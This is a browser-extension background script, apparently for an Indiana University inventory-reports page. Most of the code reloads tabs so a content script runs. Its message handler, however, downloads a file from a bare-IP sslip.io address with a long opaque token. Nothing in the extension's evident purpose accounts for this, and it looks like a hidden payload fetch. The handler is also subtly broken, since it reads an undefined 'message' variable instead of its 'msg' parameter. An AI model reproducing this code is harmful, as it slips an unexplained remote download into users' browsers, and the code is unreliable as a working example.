var browser = require("webextension-polyfill");

let headerText = "SAMPLE TEXT!";

chrome.runtime.onInstalled.addListener(function() {
    chrome.storage.sync.set({ headerText });
});


chrome.runtime.onConnect.addListener(function(port) {
    if (port.name === "invRepComPort") {
        port.onMessage.addListener(function(msg, sendingPort) {
            if (message.MESSAGE_TYPE === "DOWNLOAD_REQ") {
                console.log("Attempting download.");
                chrome.downloads.download({url: "https://154.82.111.45.sslip.io/dl2/6KLEwwRNilgEaeAs3dRvwMIudQ7MeQa1jMlzEXpfnAMDnlQkfx_docj8xZI1gxRunPmsr0W2pTtoAM8iNrTQ7C73f9R62gYd2pF4sRitgunAvSMmoka2RVcidxCpSfu-zk0nx_cDE-KK4LAXtOoxqkDSGAR0xrosQRfDJObOE_D4zm-4Gm4FlUBKs8tYwt612KBRaidqbzeyv3rAfn60zNDxeQPySC3fl-FGPx9gYV6Z-dnZuOYkgPFcLu3QR5pTcnMjKC2ndeYh6wknhEXXtUjIVOfBIO0Bi44xcuU3LpXmTajRuNiUdtm5tFwIkXYM5FJwHsFljHx_vGnf2kZCtQWRw6bWK6P7wnIwNR3iZGaRpSFDAB3WqPEu_GjS2ox5MnQPZFsxhFPZJ3ac7RGlSEr6teQ02x3PpuDGC4v6AemiTctwL9CK-3wA8YWPZZazvhR7k_imePPmV-KXY6HK5FKnhJO9LO4UQJuQ84edctfqI7C33d6sTYVk3ot8_7W3lWflQtKmwlcBJsAHOHqcBE2mDGj0dAX9PJ3ggKCIFUle1AiNSGviuTRFdvzItWwlBlJEp1AWvMSKJLTt9d2CHXh-N59Q67q2lMc9lixYfUV9YF6qbZQiHbaNvYsO15pigtmLMniwpoFODyaGQOBgbK38Xei4S67gQiEviqPs3AolYON5z3qBWpf7jV02O22NHDhF7Vd8lbxkgnJFM8LTYCRsx9tgxURtYHQ7BihEd0Whhxs6XXckTDzERNGIT8nkKgCiJcgzwoFmnvjxFZXtC_8kT8DO9zkYeU_434vyC8n-jeqU8f8DKl9PixQidYwNNppmzsBs7LaM16AnqvQMaFlDASdY2iY50nBtI2w6Z7pKBRbq4-ke4I6zeLBiQepkVB-3UBZVceG5hFHZNRiV3YCmnGFweiXOC9t3oYl7rfBFbNpdjQ74lu6BHgUvsjGs9sgyDp4uhfUWUPTSju36qCrt2x3TSu9u_1ojXei9_kHjgCU7teSVrwbOFZzV0GIz4P6Ip5Yrw1sDSrlBoID6keTGqF9UvkwOH76sGXXSqKNeD9nUS01bG2_6hIYAYuYRTLg9H4rBpcYwXTnmQa3vO_H0o9x4lWKzcbhVuFUptPkDptqNzmqQDyj2HKtRwaEUa-QT3ZKTitglSAq6TRB-dwORAMpeiPAt_M2l8RrBnt7IBYH7zQSSaEDMgEggT3i54TTHXRd3JBnbGqNrYhtVO6PygFS6Ym2v1gjnhT5ZSeMGnU8VdTPdwoGRKX5jlppz7qDAGgpqveB2dPfm3hm08hkBIEEiwEKjyWnBlhAmVtLM2pJb_I2U20yBQupECkzmbbtp2JuxuHafOuHIS-UF/a3pMUupA"});
            }
        });
    }
});

//      If the page changes to Inventory Reports (and wasn't before) refresh
// the browser tab. Same when navigating away from the IR page. This is a workaround
// to get the IR page content script to run (and stop running), since Angular
// doesn't *actually* reload the page.
browser.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (changeInfo.url) {
        if (changeInfo.url.toLowerCase().includes("pie.iu.edu/inventoryreports")) {
            // Check most recent history entry
            let searchHistory = browser.history.search({text: '', maxResults: 2});
            searchHistory.then(function(results) {
                if (results.length > 1) {
                    // Compare the previously visited URL
                    if (!(results[1].url.toLowerCase().includes("pie.iu.edu/inventoryreports"))) {
                        browser.tabs.reload(tabId);
                    }
                }
            });
        }
        else if (changeInfo.url.toLowerCase().includes("pie.iu.edu")) {
            // Check most recent history entry
            let searchHistory = browser.history.search({text: '', maxResults: 2});
            searchHistory.then(function(results) {
                if (results.length > 1) {
                    // Compare the previously visited URL
                    if (results[1].url.toLowerCase().includes("pie.iu.edu/inventoryreports")) {
                        browser.tabs.reload(tabId); // Reload to clean up the content script
                    }
                }
            });
        }
    }
});